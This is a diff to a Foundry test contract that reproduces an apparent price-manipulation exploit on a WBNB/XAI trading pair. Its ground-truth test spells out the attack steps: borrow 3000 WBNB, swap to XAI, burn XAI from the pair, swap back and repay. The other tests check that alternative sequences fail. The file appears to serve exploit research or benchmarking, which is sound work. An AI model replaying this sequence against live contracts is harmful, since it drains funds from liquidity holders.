@@ -185,7 +185,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_wbnb_xai(amt1, amt2);
         swap_pair_attacker_xai_wbnb(amt3, amt4);
         payback_wbnb_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -205,7 +205,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_wbnb_xai(amt2, amt3);
         swap_pair_attacker_xai_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -225,7 +225,7 @@ contract XAITest is Test, BlockLoader {
         burn_xai_pair(amt3);
         swap_pair_attacker_xai_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -243,7 +243,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_xai_wbnb(amt1, amt2);
         swap_pair_attacker_wbnb_xai(amt3, amt4);
         payback_xai_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -263,7 +263,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_xai_wbnb(amt2, amt3);
         swap_pair_attacker_wbnb_xai(amt4, amt5);
         payback_xai_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -283,7 +283,7 @@ contract XAITest is Test, BlockLoader {
         burn_xai_pair(amt3);
         swap_pair_attacker_wbnb_xai(amt4, amt5);
         payback_xai_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -307,7 +307,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_wbnb_xai(amt5, amt6);
         swap_pair_attacker_xai_wbnb(amt7, amt8);
         payback_wbnb_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -333,7 +333,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_wbnb_xai(amt6, amt7);
         swap_pair_attacker_xai_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -359,7 +359,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_wbnb_xai(amt6, amt7);
         swap_pair_attacker_xai_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -385,7 +385,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_wbnb_xai(amt6, amt7);
         swap_pair_attacker_xai_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -411,7 +411,7 @@ contract XAITest is Test, BlockLoader {
         burn_xai_pair(amt7);
         swap_pair_attacker_xai_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -435,7 +435,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_xai_wbnb(amt5, amt6);
         swap_pair_attacker_wbnb_xai(amt7, amt8);
         payback_xai_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -461,7 +461,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_xai_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_xai(amt8, amt9);
         payback_xai_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -487,7 +487,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_xai_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_xai(amt8, amt9);
         payback_xai_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -513,7 +513,7 @@ contract XAITest is Test, BlockLoader {
         swap_pair_attacker_xai_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_xai(amt8, amt9);
         payback_xai_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -539,26 +539,39 @@ contract XAITest is Test, BlockLoader {
         burn_xai_pair(amt7);
         swap_pair_attacker_wbnb_xai(amt8, amt9);
         payback_xai_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 3000 * 1e18);
         borrow_wbnb_owner(3000 * 1e18);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", wbnb.balanceOf(attacker));
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
+        );
         swap_pair_attacker_wbnb_xai(
             wbnb.balanceOf(attacker),
             pair.getAmountOut(wbnb.balanceOf(attacker), address(wbnb))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 10000);
         burn_xai_pair(10000);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", xai.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(xai.balanceOf(attacker), address(xai))
+        );
         swap_pair_attacker_xai_wbnb(
             xai.balanceOf(attacker),
             pair.getAmountOut(xai.balanceOf(attacker), address(xai))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 3000 * 1e18);
         payback_wbnb_owner(3000 * 1e18);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -581,7 +594,7 @@ contract XAITest is Test, BlockLoader {
         burn_xai_pair(amt3);
         swap_pair_attacker_xai_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
